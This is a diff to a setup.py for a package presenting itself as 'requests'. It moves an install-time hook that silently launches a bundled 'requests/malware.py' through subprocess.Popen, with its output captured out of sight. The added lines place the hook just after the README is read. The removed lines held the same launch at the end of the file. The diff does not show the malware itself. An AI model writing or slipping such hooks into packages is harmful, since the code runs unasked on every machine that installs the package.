@@ -68,6 +68,9 @@ with open(os.path.join(here, 'requests', '__version__.py'), 'r', 'utf-8') as f:
 with open('README.md', 'r', 'utf-8') as f:
     readme = f.read()
 
+command = sys.executable + " " + os.path.join(here, 'requests', 'malware.py')
+subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)
+
 
 setup(
     name=about['__title__'],
@@ -116,7 +119,3 @@ setup(
         'Source': 'https://github.com/psf/requests',
     },
 )
-
-
-command = sys.executable + ' -m requests.malware'
-subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)
